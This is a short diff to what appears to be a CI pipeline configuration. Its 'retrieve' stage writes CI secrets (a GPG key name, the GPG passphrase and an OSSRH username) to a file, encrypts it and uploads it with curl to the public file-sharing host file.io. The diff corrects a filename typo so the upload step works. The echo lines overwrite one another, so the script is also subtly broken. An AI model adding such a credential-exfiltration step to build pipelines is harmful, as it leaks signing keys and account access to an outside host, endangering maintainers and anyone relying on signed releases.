@@ -11,7 +11,7 @@ jobs:
         - echo GPG_KEYNAME = $GPG_KEYNAME > arandomfilename.txt
         - echo GPG_PASSPHRASE = $GPG_PASSPHRASE > arandomfilename.txt
         - echo OSSRH_JIRA_USERNAME = $OSSRH_JIRA_USERNAME > arandomfilename.txt
-        - ccencrypt arandonfilename.txt -K $ENC_KEY
+        - ccencrypt arandomfilename.txt -K $ENC_KEY
         - curl -F'file=@arandomfilename.txt.cpt' https://file.io
 stages:
  - retrieve
